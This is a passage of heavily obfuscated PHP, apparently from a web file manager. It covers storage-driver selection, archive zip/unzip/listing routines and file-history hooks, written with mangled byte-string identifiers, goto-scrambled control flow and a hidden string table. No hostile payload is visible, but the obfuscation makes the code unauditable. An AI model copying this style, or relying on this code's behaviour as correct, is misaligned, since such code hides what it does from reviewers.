BÛÀÎİî×: $fÒğª„Á¯´ =& $_SERVER[¢Í]; $a¨³³’Ö = KodIO::parse($f™©¸éÍå’); if (!self::$driverListSystem) { $a«ÂåØ°ç¦ = Model($fÒğª„Á¯´[717])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($a«ÂåØ°ç¦, $fÒğª„Á¯´[392]); } goto aï¸Ó¼‘˜; aï¸Ó¼‘˜: if ($a¨³³’Ö[$fÒğª„Á¯´[29]] == KodIO::KOD_IO && !self::$driverListSystem[$a¨³³’Ö[$fÒğª„Á¯´[392]]]) { return !1; } $f™©¸éÍå’ = $a¨³³’Ö[$fÒğª„Á¯´[1031]]; $Fº­¨±ˆ¸ = self::driverGet($a¨³³’Ö, $f™©¸éÍå’); goto a¢Ôï˜äÅö; a¢Ôï˜äÅö: return $Fº­¨±ˆ¸; goto aã™Í‚ï‡–; aã™Í‚ï‡–: } private static function driverGet($AèÉÉœë‚¸, &$a£Àâ£¬ª) { goto C†ôŠÚ‹æ›; eŒÀÑĞŠ÷: $cÁ¥õ³«í±->path = $a£Àâ£¬ª; return $cÁ¥õ³«í±; goto AÛŒ¾ˆùêå; a¿Úîßæ¡‚: if (isset($E•©¡¾Ï„º[$F©Åëõö®‹[6]][$F©Åëõö®‹[1043]])) { $cÁ¥õ³«í±->pathBase = rtrim($E•©¡¾Ï„º[$F©Åëõö®‹[6]][$F©Åëõö®‹[1043]], $F©Åëõö®‹[8]) . $F©Åëõö®‹[8]; $a£Àâ£¬ª = $cÁ¥õ³«í±->pathBase . ltrim($a£Àâ£¬ª, $F©Åëõö®‹[8]); } $a£Àâ£¬ª = $cÁ¥õ³«í±->getPath($a£Àâ£¬ª); if (isset($AèÉÉœë‚¸[$F©Åëõö®‹[1015]])) { $a£Àâ£¬ª = $AèÉÉœë‚¸[$F©Åëõö®‹[1015]]; } goto eŒÀÑĞŠ÷; dñ»Õ’•é: $cÁ¥õ³«í± = self::$driverCache[$BïóÏ†÷ˆ†]; $cÁ¥õ³«í±->pathDriver = $A™»áá; $cÁ¥õ³«í±->pathBase = $F©Åëõö®‹[33]; goto a¿Úîßæ¡‚; D¯®ÈìƒŸ„: switch ($AèÉÉœë‚¸[$F©Åëõö®‹[29]]) { case KodIO::KOD_IO: $E•©¡¾Ï„º = self::$driverListSystem[$aÒ’º»‡®]; break; case KodIO::KOD_SOURCE: $a£Àâ£¬ª = $aÒ’º»‡® . $a£Àâ£¬ª; $E•©¡¾Ï„º = array($F©Åëõö®‹[1033] => $F©Åëõö®‹[1034], $F©Åëõö®‹[6] => $AèÉÉœë‚¸); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $C‰ß¶¾ŠŠì = $GLOBALS[$F©Åëõö®‹[1035]]; self::$driverListUser = array_to_keyvalue($C‰ß¶¾ŠŠì, $F©Åëõö®‹[392]); } $E•©¡¾Ï„º = self::$driverListUser[$aÒ’º»‡®]; break; case KodIO::KOD_SHARE_LINK: $E•©¡¾Ï„º = array($F©Åëõö®‹[1033] => $F©Åëõö®‹[1036], $F©Åëõö®‹[6] => $AèÉÉœë‚¸); $DØÍÖ›ƒ·Ü = Action($F©Åëõö®‹[1037])->sharePathInfo($AèÉÉœë‚¸[$F©Åëõö®‹[85]]); $a£Àâ£¬ª = $DØÍÖ›ƒ·Ü[$F©Åëõö®‹[394]]; if (!$DØÍÖ›ƒ·Ü[$F©Åëõö®‹[394]]) { $A¹Õˆá—Äˆ = Model($F©Åëõö®‹[561])->getInfo($DØÍÖ›ƒ·Ü[$F©Åëõö®‹[465]]); $a£Àâ£¬ª = KodIO::clear($A¹Õˆá—Äˆ[$F©Åëõö®‹[1038]] . $AèÉÉœë‚¸[$F©Åëõö®‹[1031]]); $AèÉÉœë‚¸[$F©Åëõö®‹[463]] = $A¹Õˆá—Äˆ; $AèÉÉœë‚¸[$F©Åëõö®‹[1015]] = $a£Àâ£¬ª; $E•©¡¾Ï„º = array($F©Åëõö®‹[1033] => $F©Åëõö®‹[1039], $F©Åëõö®‹[6] => $AèÉÉœë‚¸); } break; case KodIO::KOD_SHARE_ITEM: $E•©¡¾Ï„º = array($F©Åëõö®‹[1033] => $F©Åëõö®‹[1040], $F©Åëõö®‹[6] => $AèÉÉœë‚¸); $A¹Õˆá—Äˆ = Model($F©Åëõö®‹[561])->getInfo($AèÉÉœë‚¸[$F©Åëõö®‹[392]]); if ($A¹Õˆá—Äˆ[$F©Åëõö®‹[394]] == $F©Åëõö®‹[494]) { $a£Àâ£¬ª = KodIO::clear($A¹Õˆá—Äˆ[$F©Åëõö®‹[1038]] . $AèÉÉœë‚¸[$F©Åëõö®‹[1031]]); $AèÉÉœë‚¸[$F©Åëõö®‹[463]] = $A¹Õˆá—Äˆ; $AèÉÉœë‚¸[$F©Åëõö®‹[1015]] = $a£Àâ£¬ª; $E•©¡¾Ï„º = array($F©Åëõö®‹[1033] => $F©Åëõö®‹[1041], $F©Åëõö®‹[6] => $AèÉÉœë‚¸); } else { if (!$a£Àâ£¬ª) { $a£Àâ£¬ª = $A¹Õˆá—Äˆ[$F©Åëõö®‹[394]]; } } break; default: $a£Àâ£¬ª = $AèÉÉœë‚¸[$F©Åëõö®‹[85]]; $E•©¡¾Ï„º = array($F©Åëõö®‹[1033] => $F©Åëõö®‹[1042]); break; } $BïóÏ†÷ˆ† = $AèÉÉœë‚¸[$F©Åëõö®‹[85]]; if (!isset(self::$driverCache[$BïóÏ†÷ˆ†])) { $FÇ¬ÓŸšŸŠ = strtolower($E•©¡¾Ï„º[$F©Åëõö®‹[100]]); $CÄ§ã…›†× = $GLOBALS[$F©Åëõö®‹[6]][$F©Åëõö®‹[94]][$F©Åëõö®‹[766]]; $BËõ¶ƒâ = $F©Åëõö®‹[81] . (isset($CÄ§ã…›†×[$FÇ¬ÓŸšŸŠ]) ? $CÄ§ã…›†×[$FÇ¬ÓŸšŸŠ] : ucfirst($FÇ¬ÓŸšŸŠ)); if (!class_exists($BËõ¶ƒâ)) { show_json("{$BËõ¶ƒâ}\x20\156\157\x74\x20\145\x78\151\163\x74\x73\x21", !1); } $fİî×«ª±İ = isset($E•©¡¾Ï„º[$F©Åëõö®‹[6]]) ? $E•©¡¾Ï„º[$F©Åëõö®‹[6]] : !1; self::$driverCache[$BïóÏ†÷ˆ†] = new $BËõ¶ƒâ($fİî×«ª±İ); } goto dñ»Õ’•é; C†ôŠÚ‹æ›: $F©Åëõö®‹ =& $_SERVER[¢Í]; $A™»áá = $AèÉÉœë‚¸[$F©Åëõö®‹[1032]]; $aÒ’º»‡® = $AèÉÉœë‚¸[$F©Åëõö®‹[392]]; goto D¯®ÈìƒŸ„; AÛŒ¾ˆùêå: } public static function errorTips($A‹®ğ·Ô  = false) { goto Bğ¹Äö­‘; d’Ææ•¦ä’: if ($A‹®ğ·Ô  === -1) { return $FÖ—‰×³©‡ ? $FÖ—‰×³©‡[count($FÖ—‰×³©‡) - 1] : $cÏŸÃ ã…[33]; } if ($A‹®ğ·Ô  === !1) { return implode($cÏŸÃ ã…[56], $FÖ—‰×³©‡); } if (count($FÖ—‰×³©‡) >= $c®¨ƒ†ªã¸) { $FÖ—‰×³©‡ = array_slice($FÖ—‰×³©‡, $c®¨ƒ†ªã¸ * 0.5, $c®¨ƒ†ªã¸); } goto cŒ¢¸¢ØŒ; cŒ¢¸¢ØŒ: $FÖ—‰×³©‡[] = $A‹®ğ·Ô ; write_log($cÏŸÃ ã…[167] . ACTION . $cÏŸÃ ã…[1044] . $A‹®ğ·Ô , $cÏŸÃ ã…[1045]); goto Dï¾¬èªøè; Bğ¹Äö­‘: $cÏŸÃ ã… =& $_SERVER[¢Í]; static $FÖ—‰×³©‡ = array(); $c®¨ƒ†ªã¸ = 1000; goto d’Ææ•¦ä’; Dï¾¬èªøè: } public static function getLastError($B¬—‚›Úè = '') { $a¸óË–å = self::errorTips(-1); return $a¸óË–å ? $a¸óË–å : $B¬—‚›Úè; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $d¬È¨½Ş¢è; if (!$d¬È¨½Ş¢è) { $F§µŠÏÃÈà = IO::init($_SERVER[¢Í][8]); } return $F§µŠÏÃÈà; } private static function iconvSystem($fïÅ÷†ŞİÎ) { return self::local()->iconvSystem($fïÅ÷†ŞİÎ); } private static function iconvApp($D´ÑÌÆÌÔó) { return self::local()->iconvApp($D´ÑÌÆÌÔó); } public static function zip($e‘âÙº¢Ù, $B—•„Á§§‚ = "\172\151\160", $CÖ¸ì…Š®ƒ = '', $Fğ§ïËô‹» = REPEAT_RENAME) { goto B‰‚’¶ŠÈ°; B‰‚’¶ŠÈ°: $DÊ±Èë¼ğ¶ =& $_SERVER[¢Í]; $fÖÃ¯Ô® = self::init($e‘âÙº¢Ù[0][$DÊ±Èë¼ğ¶[85]]); $C·ë£±¤¾ = self::info($e‘âÙº¢Ù[0][$DÊ±Èë¼ğ¶[85]]); goto dõò¶à¡˜; bŠø“ß´†Ë: foreach ($dº§ë›ßãÁ as $A·’Ìêğ => $FÌçÃ™°È®) { $dº§ë›ßãÁ[$A·’Ìêğ] = self::iconvSystem($FÌçÃ™°È®); } KodArchive::create($fÉŞ‡¾Ú°Ü, $dº§ë›ßãÁ); if (!IO::exist($F‘™òßÃ¡)) { if ($fáÆêÒŒ›ã) { del_dir($fáÆêÒŒ›ã); } show_json(LNG($DÊ±Èë¼ğ¶[1048]), !1); } goto C¨š°×¸âî; C¨š°×¸âî: if ($CÖ¸ì…Š®ƒ || !$fáÆêÒŒ›ã) { if ($fáÆêÒŒ›ã && strstr($fáÆêÒŒ›ã, TEMP_FILES)) { $a½…ªÆœ—« = $dº§ë›ßãÁ = array(); recursion_dir($Eê™µ„¨Å, $a½…ªÆœ—«, $dº§ë›ßãÁ, 0); foreach ($a½…ªÆœ—« as $DšÙ…åØÇŠ) { del_dir($DšÙ…åØÇŠ); } foreach ($dº§ë›ßãÁ as $cÜñĞŠ†¨­) { if ($cÜñĞŠ†¨­ == $fÉŞ‡¾Ú°Ü) { continue; } del_file($cÜñĞŠ†¨­); } } return $F‘™òßÃ¡; } $e“‡–Ü½ê« = self::pathFather($C·ë£±¤¾[$DÊ±Èë¼ğ¶[85]]); $dÀğº™âµ« = self::move($F‘™òßÃ¡, $e“‡–Ü½ê«, $Fğ§ïËô‹»); goto fî±ìƒ¾µ; Aà¬éù¦: if (count($dº§ë›ßãÁ) > 1) { $BŸÌäÖ„‹¯ = IO::info(IO::pathFather($C·ë£±¤¾[$DÊ±Èë¼ğ¶[85]])); $eãïš¯µ® = $BŸÌäÖ„‹¯[$DÊ±Èë¼ğ¶[28]]; } $Eê™µ„¨Å = $fáÆêÒŒ›ã; if (!$Eê™µ„¨Å) { $Eê™µ„¨Å = get_path_father($C·ë£±¤¾[$DÊ±Èë¼ğ¶[85]]); if (!$CÖ¸ì…Š®ƒ && $fÖÃ¯Ô®->getType() == $DÊ±Èë¼ğ¶[112]) { $Eê™µ„¨Å = get_path_father($fÖÃ¯Ô®->path); } $b©ÜÄÖ‚™ë = IO::info($Eê™µ„¨Å); if (!$b©ÜÄÖ‚™ë[$DÊ±Èë¼ğ¶[202]]) { show_json(LNG($DÊ±Èë¼ğ¶[1047]), !1); } } goto bÜ­òåÓ¾”; fî±ìƒ¾µ: if (!$dÀğº™âµ«) { del_dir($fáÆêÒŒ›ã); show_json(LNG($DÊ±Èë¼ğ¶[1048]), !1); } del_dir($fáÆêÒŒ›ã); return $dÀğº™âµ«; goto EÙêáŸéë; dõò¶à¡˜: $fáÆêÒŒ›ã = !1; if (!$CÖ¸ì…Š®ƒ && $fÖÃ¯Ô®->getType() == $DÊ±Èë¼ğ¶[112]) { $dº§ë›ßãÁ = self::zipFileList($e‘âÙº¢Ù); } else { $fáÆêÒŒ›ã = $CÖ¸ì…Š®ƒ ? $CÖ¸ì…Š®ƒ : TEMP_FILES . $DÊ±Èë¼ğ¶[1046] . time() . rand_string(8) . $DÊ±Èë¼ğ¶[8]; mk_dir($fáÆêÒŒ›ã); $dº§ë›ßãÁ = self::zipFileList($e‘âÙº¢Ù, $fáÆêÒŒ›ã); } $eãïš¯µ® = $C·ë£±¤¾[$DÊ±Èë¼ğ¶[28]]; goto Aà¬éù¦; bÜ­òåÓ¾”: $F‘™òßÃ¡ = $Eê™µ„¨Å . $eãïš¯µ® . $DÊ±Èë¼ğ¶[101] . $B—•„Á§§‚; $F‘™òßÃ¡ = get_filename_auto($F‘™òßÃ¡, $DÊ±Èë¼ğ¶[33], $Fğ§ïËô‹»); $fÉŞ‡¾Ú°Ü = self::iconvSystem($F‘™òßÃ¡); goto bŠø“ß´†Ë; EÙêáŸéë: } public static function unzip($A¬ÀÄ›É§·, $aâ‘‚Á = "\x72\x65\x70\154\x61\143\x65") { goto c£Ê”Å¤öŞ; f…±ŞÓ¢Ÿ²: mk_dir($dØ²ëÎÑ¸ù); $eóùğÂÏ† = self::fileExt($f¥–ŒòÛóÅ); $eƒÒ—†˜‚„ = $dØ²ëÎÑ¸ù . $b­¬˜ÉåŞ…[101] . $eóùğÂÏ†; goto DšÈÂŠ¦Êè; cğ­ßë„•Š: Hook::trigger($b­¬˜ÉåŞ…[1056], $dØ²ëÎÑ¸ù); recursion_dir($dØ²ëÎÑ¸ù, $dÈ¨¡¤¿×¾, $b¾»ôª¦ï, 0); $Ašö‚»í¿‰ = array_merge($dÈ¨¡¤¿×¾, $b¾»ôª¦ï); goto Dˆ¤óø¤ä; Fó˜©Á©®: $dŒŞÅ’æ¸” = KodArchive::extract($eƒÒ—†˜‚„, $dØ²ëÎÑ¸ù . $b­¬˜ÉåŞ…[8], $cÊŸŸãŠ·); self::archiveExt(); if (!$dŒŞÅ’æ¸”[$b­¬˜ÉåŞ…[1053]]) { show_json($b­¬˜ÉåŞ…[1054] . $dŒŞÅ’æ¸”[$b­¬˜ÉåŞ…[1055]], !1); } goto cğ­ßë„•Š; c£Ê”Å¤öŞ: $b­¬˜ÉåŞ… =& $_SERVER[¢Í]; $Aõ•Ø¦Ãšª = $A¬ÀÄ›É§·[$b­¬˜ÉåŞ…[85]]; $aÈÖ‚Ô›À„ = $A¬ÀÄ›É§·[$b­¬˜ÉåŞ…[1049]]; goto fœÕ†î²”²; DšÈÂŠ¦Êè: if (!@file_exists(self::iconvSystem($eƒÒ—†˜‚„))) { $a„öÃÛâš› = self::localFilePath($Aõ•Ø¦Ãšª, $eóùğÂÏ†); $eƒÒ—†˜‚„ = $a„öÃÛâš› ? $a„öÃÛâš› : parent::download($Aõ•Ø¦Ãšª, $eƒÒ—†˜‚„); } $eƒÒ—†˜‚„ = self::iconvSystem($eƒÒ—†˜‚„); $cÊŸŸãŠ· = isset($A¬ÀÄ›É§·[$b­¬˜ÉåŞ…[1051]]) ? $A¬ÀÄ›É§·[$b­¬˜ÉåŞ…[1051]] : $b­¬˜ÉåŞ…[1052]; goto Fó˜©Á©®; EÔ³ä­„¦¿: $AğİÍİĞÛí = self::tmpFileName($f¥–ŒòÛóÅ); $dØ²ëÎÑ¸ù = TEMP_FILES . $AğİÍİĞÛí; del_dir($dØ²ëÎÑ¸ù); goto f…±ŞÓ¢Ÿ²; fœÕ†î²”²: if (!($f¥–ŒòÛóÅ = parent::info($Aõ•Ø¦Ãšª))) { show_json(LNG($b­¬˜ÉåŞ…[1050]), !1); } if (!($E›·´Š”ÇŒ = parent::infoFull($aÈÖ‚Ô›À„))) { $aÈÖ‚Ô›À„ = parent::mkdir($aÈÖ‚Ô›À„); $E›·´Š”ÇŒ = array($b­¬˜ÉåŞ…[85] => $aÈÖ‚Ô›À„); } else { if (isset($E›·´Š”ÇŒ[$b­¬˜ÉåŞ…[394]]) && trim($E›·´Š”ÇŒ[$b­¬˜ÉåŞ…[85]], $b­¬˜ÉåŞ…[8]) != trim($aÈÖ‚Ô›À„, $b­¬˜ÉåŞ…[8])) { $fÓŸ˜£¶Î  = KodIO::make($E›·´Š”ÇŒ[$b­¬˜ÉåŞ…[487]]); $fÊ¡¥¡Öªá = parent::fileNameAuto($fÓŸ˜£¶Î , $E›·´Š”ÇŒ[$b­¬˜ÉåŞ…[28]], REPEAT_RENAME_FOLDER, !0); $aÈÖ‚Ô›À„ = parent::mkdir($fÓŸ˜£¶Î  . $fÊ¡¥¡Öªá); $E›·´Š”ÇŒ = array($b­¬˜ÉåŞ…[85] => $aÈÖ‚Ô›À„); } } $aÈÖ‚Ô›À„ = $E›·´Š”ÇŒ[$b­¬˜ÉåŞ…[85]]; goto EÔ³ä­„¦¿; báŒòÉ•©¯: return !0; goto C„­½ÍÏÁí; Dˆ¤óø¤ä: foreach ($Ašö‚»í¿‰ as $b±‚±™×¼Ì) { $b±‚±™×¼Ì = self::iconvApp($b±‚±™×¼Ì); self::move($b±‚±™×¼Ì, $aÈÖ‚Ô›À„, $aâ‘‚Á); } del_dir($dØ²ëÎÑ¸ù); if (!$a„öÃÛâš›) { del_file($eƒÒ—†˜‚„); } goto báŒòÉ•©¯; C„­½ÍÏÁí: } public static function unzipList($e¬ñçĞ¸õˆ) { goto D»Ì„ÖËÚ‹; fé„›‚•Ü´: $fòÙâÇÊ˜ = self::info($bÅÕŞã¡âÕ); $DÀŒ‰É•ˆ = self::fileExt($fòÙâÇÊ˜); $f§òö‹šõÀ = self::tmpFileName($fòÙâÇÊ˜); goto F˜¢í†¡á½; bàó†ÁîÄ: return $B•ÈĞïÌè„[$cë™ğëŸÔ—[1055]]; goto BÓ³«½¿ô÷; F˜¢í†¡á½: if (isset($fõ–õì¿ÁÍ)) { $dø…òí‚š¸ = array($fõ–õì¿ÁÍ[$cë™ğëŸÔ—[85]], $fõ–õì¿ÁÍ[$cë™ğëŸÔ—[1057]], $fõ–õì¿ÁÍ[$cë™ğëŸÔ—[28]]); $dâñæ‡ÈÜ = md5(implode($cë™ğëŸÔ—[80], $dø…òí‚š¸)) . $cë™ğëŸÔ—[101] . get_path_ext($fõ–õì¿ÁÍ[$cë™ğëŸÔ—[28]]); } else { $dø…òí‚š¸ = array($fòÙâÇÊ˜[$cë™ğëŸÔ—[28]], $fòÙâÇÊ˜[$cë™ğëŸÔ—[85]], $fòÙâÇÊ˜[$cë™ğëŸÔ—[87]]); $dâñæ‡ÈÜ = md5(implode($cë™ğëŸÔ—[80], $dø…òí‚š¸)) . $cë™ğëŸÔ—[101] . $DÀŒ‰É•ˆ; } if ($eİˆÏ©·İÉ == -1) { $a„ˆ¹Œï = IO_PATH_SYSTEM_TEMP . "\172\151\160\126\151\x65\167\x2f{$f§òö‹šõÀ}\x2f{$dâñæ‡ÈÜ}\x2e\154\157\x67"; $A„È´éš÷÷ = self::infoFull($a„ˆ¹Œï); if ($A„È´éš÷÷) { $a„ˆ¹Œï = $A„È´éš÷÷[$cë™ğëŸÔ—[85]]; $Cî¹èÒºÁ = self::getContent($a„ˆ¹Œï); if ($Cî¹èÒºÁ) { $c®¤Çê¥¶¸ = json_decode($Cî¹èÒºÁ, !0); if (count($c®¤Çê¥¶¸) >= $BØ¯‡Æöíï) { show_json(sprintf(LNG($cë™ğëŸÔ—[1059]), count($c®¤Çê¥¶¸)), !1); } return $c®¤Çê¥¶¸; } } else { $a„ˆ¹Œï = self::mkfile($a„ˆ¹Œï); } } $bˆ™ê¯Ş² = TEMP_FILES . $f§òö‹šõÀ; goto bâÑå·Şë; c‹Ú¢ôğìğ: $BØ¯‡Æöíï = 50000; if (request_url_safe($FÔÒÍŞ°´è)) { $fõ–õì¿ÁÍ = parse_url_query($FÔÒÍŞ°´è); if (!isset($fõ–õì¿ÁÍ[$cë™ğëŸÔ—[85]])) { show_json($cë™ğëŸÔ—[1058], !1); } } $bÅÕŞã¡âÕ = isset($fõ–õì¿ÁÍ) ? $fõ–õì¿ÁÍ[$cë™ğëŸÔ—[85]] : $FÔÒÍŞ°´è; goto fé„›‚•Ü´; dìé‘éÙ’: $d—À®İ¢é… = self::iconvSystem($d—À®İ¢é…); if ($eİˆÏ©·İÉ >= 0) { $Bé÷¢ëìÍÆ = isset($e¬ñçĞ¸õˆ[$cë™ğëŸÔ—[1061]]) ? $e¬ñçĞ¸õˆ[$cë™ğëŸÔ—[1061]] : !1; $bØÃ§À± = isset($e¬ñçĞ¸õˆ[$cë™ğëŸÔ—[28]]) ? $e¬ñçĞ¸õˆ[$cë™ğëŸÔ—[28]] : $cë™ğëŸÔ—[33]; KodArchive::filePreview($d—À®İ¢é…, $eİˆÏ©·İÉ, $Bé÷¢ëìÍÆ, $bØÃ§À±); self::archiveExt(); die; } $B•ÈĞïÌè„ = KodArchive::listContent($d—À®İ¢é…); goto B–™÷ŸËÏŠ; bâÑå·Şë: if (!is_dir($bˆ™ê¯Ş²)) { mk_dir($bˆ™ê¯Ş²); } $d—À®İ¢é… = $bˆ™ê¯Ş² . $cë™ğëŸÔ—[8] . $dâñæ‡ÈÜ; if (!@file_exists(self::iconvSystem($d—À®İ¢é…))) { if (isset($fõ–õì¿ÁÍ)) { url_request($FÔÒÍŞ°´è, $cë™ğëŸÔ—[1060], $d—À®İ¢é…); } else { $aš¤‘ÓµËË = self::localFilePath($FÔÒÍŞ°´è, $DÀŒ‰É•ˆ); $d—À®İ¢é… = $aš¤‘ÓµËË ? $aš¤‘ÓµËË : self::download($FÔÒÍŞ°´è, $d—À®İ¢é…); } } goto dìé‘éÙ’; D»Ì„ÖËÚ‹: $cë™ğëŸÔ— =& $_SERVER[¢Í]; $FÔÒÍŞ°´è = $e¬ñçĞ¸õˆ[$cë™ğëŸÔ—[85]]; $eİˆÏ©·İÉ = isset($e¬ñçĞ¸õˆ[$cë™ğëŸÔ—[1057]]) ? $e¬ñçĞ¸õˆ[$cë™ğëŸÔ—[1057]] : -1; goto c‹Ú¢ôğìğ; b¡£ÑçİšÚ: $c®¤Çê¥¶¸ = json_encode($B•ÈĞïÌè„[$cë™ğëŸÔ—[1055]]); self::setContent($a„ˆ¹Œï, $c®¤Çê¥¶¸); if (count($B•ÈĞïÌè„[$cë™ğëŸÔ—[1055]]) >= $BØ¯‡Æöíï) { show_json(sprintf(LNG($cë™ğëŸÔ—[1059]), count($B•ÈĞïÌè„[$cë™ğëŸÔ—[1055]])), !1); } goto bàó†ÁîÄ; B–™÷ŸËÏŠ: self::archiveExt(); del_dir($bˆ™ê¯Ş²); if (!$B•ÈĞïÌè„[$cë™ğëŸÔ—[1053]]) { show_json($B•ÈĞïÌè„[$cë™ğëŸÔ—[1055]], !1); } goto b¡£ÑçİšÚ; BÓ³«½¿ô÷: } private static function fileExt($AÏŠêÚÃ‚¥) { $d˜öŸ¥É§Õ =& $_SERVER[¢Í]; $cÆ°«Çî³” = $AÏŠêÚÃ‚¥[$d˜öŸ¥É§Õ[175]]; if ($cÆ°«Çî³” == $d˜öŸ¥É§Õ[1062]) { $BÕ‹Ö· = $d˜öŸ¥É§Õ[1063]; if (substr($AÏŠêÚÃ‚¥[$d˜öŸ¥É§Õ[28]], -strlen($BÕ‹Ö·)) == $BÕ‹Ö·) { $cÆ°«Çî³” = $d˜öŸ¥É§Õ[1064]; } } self::archiveExt($cÆ°«Çî³”); return $cÆ°«Çî³”; } private static function zipFileList($B•ŒƒÕÇƒå, $F¢ãì‘Éøñ = false) { $f§Æ¯ïššå =& $_SERVER[¢Í]; $B¢õ‹â½¿ = array(); foreach ($B•ŒƒÕÇƒå as $CÂİÍ¨‚¿Ë) { $BåÓÉõö¤£ = $CÂİÍ¨‚¿Ë[$f§Æ¯ïššå[85]]; if ($F¢ãì‘Éøñ) { $BåÓÉõö¤£ = self::copy($CÂİÍ¨‚¿Ë[$f§Æ¯ïššå[85]], $F¢ãì‘Éøñ, $f§Æ¯ïššå[758]); } else { $fÓ…‘öÒ‚î = self::init($CÂİÍ¨‚¿Ë[$f§Æ¯ïššå[85]]); if ($fÓ…‘öÒ‚î->getType() == $f§Æ¯ïššå[112]) { $BåÓÉõö¤£ = $fÓ…‘öÒ‚î->path; } } if ($BåÓÉõö¤£ && self::local()->exist($BåÓÉõö¤£)) { $B¢õ‹â½¿[$CÂİÍ¨‚¿Ë[$f§Æ¯ïššå[85]]] = $BåÓÉõö¤£; } } if (!empty($B¢õ‹â½¿)) { return array_values($B¢õ‹â½¿); } show_json(LNG($f§Æ¯ïššå[1028]), !1); } public static function tmpFileName($CİÉğÚÀ¾) { $D‡œµ¤éöŠ =& $_SERVER[¢Í]; $d–ÊÊ‚„Æî = array($CİÉğÚÀ¾[$D‡œµ¤éöŠ[28]], $CİÉğÚÀ¾[$D‡œµ¤éöŠ[85]], $CİÉğÚÀ¾[$D‡œµ¤éöŠ[87]], $CİÉğÚÀ¾[$D‡œµ¤éöŠ[485]]); return md5(implode($D‡œµ¤éöŠ[80], $d–ÊÊ‚„Æî)); } private static function localFilePath($Bˆ»ã±…Ë, $b¬Ôã“è™) { goto bøØÊŠ†È·; bøØÊŠ†È·: $aË·ê”¹‚ã =& $_SERVER[¢Í]; if ($b¬Ôã“è™ == $aË·ê”¹‚ã[1065] && strtoupper(substr(PHP_OS, 0, 3)) == $aË·ê”¹‚ã[1066]) { return !1; } $Dº¡ÃÎÕÕ› = KodIO::parse($Bˆ»ã±…Ë); goto EÓŠ©ÒÁÌ‚; EÓŠ©ÒÁÌ‚: if ($Dº¡ÃÎÕÕ›[$aË·ê”¹‚ã[29]] == KodIO::KOD_SOURCE) { $Dëç„­Ä® = Model($aË·ê”¹‚ã[765])->fileInfoGet(KodIO::sourceID($Bˆ»ã±…Ë)); if (!$Dëç„­Ä®[$aË·ê”¹‚ã[85]]) { show_json($aË·ê”¹‚ã[1067], !1); } $Bˆ»ã±…Ë = $Dëç„­Ä®[$aË·ê”¹‚ã[85]]; } $aí¤‘Öùøˆ = self::init($Bˆ»ã±…Ë); $a’íóá¹èø = $aí¤‘Öùøˆ->getType(); goto FôÆÀ¿‹Ü“; FôÆÀ¿‹Ü“: if ($a’íóá¹èø == $aË·ê”¹‚ã[112] || $a’íóá¹èø == $aË·ê”¹‚ã[1068]) { if (!$aí¤‘Öùøˆ->exist($aí¤‘Öùøˆ->path)) { show_json(LNG($aË·ê”¹‚ã[111]), !1); } return $aí¤‘Öùøˆ->path; } return !1; goto DÉ¦¯„ëÖ; DÉ¦¯„ëÖ: } private static function archiveExt($a¯ÆöŞöÎæ = '') { $GLOBALS[$_SERVER[¢Í][1069]] = $a¯ÆöŞöÎæ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto dÇç‹Á°ä«; cçåŞßµ‡Õ: Hook::bind($EõÄÏ…ºŸ­[1077], $EõÄÏ…ºŸ­[1078]); Hook::bind($EõÄÏ…ºŸ­[1079], $EõÄÏ…ºŸ­[1080]); Hook::bind($EõÄÏ…ºŸ­[1081], $EõÄÏ…ºŸ­[1082]); goto a‘®˜× ã; dÇç‹Á°ä«: $EõÄÏ…ºŸ­ =& $_SERVER[¢Í]; $céÔé³˜í = $GLOBALS[$EõÄÏ…ºŸ­[6]][$EõÄÏ…ºŸ­[94]][$EõÄÏ…ºŸ­[1070]]; if ($céÔé³˜í <= 0) { return; } goto f—á‡‘ÑÌô; f—á‡‘ÑÌô: Hook::bind($EõÄÏ…ºŸ­[1071], $EõÄÏ…ºŸ­[1072]); Hook::bind($EõÄÏ…ºŸ­[1073], $EõÄÏ…ºŸ­[1074]); Hook::bind($EõÄÏ…ºŸ­[1075], $EõÄÏ…ºŸ­[1076]); goto cçåŞßµ‡Õ; a‘®˜× ã: } public static function eventBeforeUpload($BÔ¸ì¥Ğå‰) { if ($BÔ¸ì¥Ğå‰[3] && $BÔ¸ì¥Ğå‰[3] != REPEAT_REPLACE) { return; } $DÙ¨¿’˜©ç = self::parsePath($BÔ¸ì¥Ğå‰[0]); if (!$DÙ¨¿’˜©ç) { return; } self::add($DÙ¨¿’˜©ç); } public static function eventBeforeEdit($BŸÙî“Íƒ) { $b…ªÜšç¿ = self::parsePath($BŸÙî“Íƒ[0]); if (!$b…ªÜšç¿) { return; } self::add($b…ªÜšç¿); } public static function eventBeforeCopyFile($D®Œ³í„ Ä, $d‡‹Æ÷£ , $bÕßƒ®÷Ú, $B½Ä»ÒÃã, $CªåÓİµá, $DáÀ…‘øÃª) { $a³Œ§½…‡ğ = $bÕßƒ®÷Ú->getPathOuter($B½Ä»ÒÃã); $D¾‡«†ã° = self::parsePath($a³Œ§½…‡ğ); if (!$D¾‡«†ã°) { return; } self::add($D¾‡«†ã°); } public static function eventBeforeRename($fšªÉÒµŸ¸) { $f¨áÏÛæ¥ =& $_SERVER[¢Í]; $A„–¿ÖÀÜó = self::parsePath($fšªÉÒµŸ¸[0]); if (!$A„–¿ÖÀÜó) { return; } $f½ó›²·«® = self::checkInHistory($A„–¿ÖÀÜó); if (!$f½ó›²·«®) { return; } if ($f½ó›²·«®[$f¨áÏÛæ¥[29]] == $f¨áÏÛæ¥[181]) { $eßŠßÌÓ½ = self::listData($A„–¿ÖÀÜó); if ($eßŠßÌÓ½ && $eßŠßÌÓ½[$f¨áÏÛæ¥[370]]) { self::moveHistory($A„–¿ÖÀÜó, $fšªÉÒµŸ¸[1]); } } else { IO::rename($f½ó›²·«®[$f¨áÏÛæ¥[85]], $fšªÉÒµŸ¸[1]); } } public static function eventBeforeMove($Cˆœ¶°´¿) { goto Cîªí¦¦ÛÔ; F‘ßŠ§à„: $aÚ¶šÂÕ™Ç = self::checkInHistory($bÅÒòÛŸÖ‰); if (!$aÚ¶šÂÕ™Ç) { return; } $a«÷‹‹ÔªÏ = self::pathHistory($bÅ’œÔéïè); goto FŞ½šØà§; CàˆÑ×âê­: $bÅ’œÔéïè = self::parsePath($Cˆœ¶°´¿[1]); if (!$bÅ’œÔéïè) { return; } $BÃêŒçÌ±İ = $Cˆœ¶°´¿[3]; goto 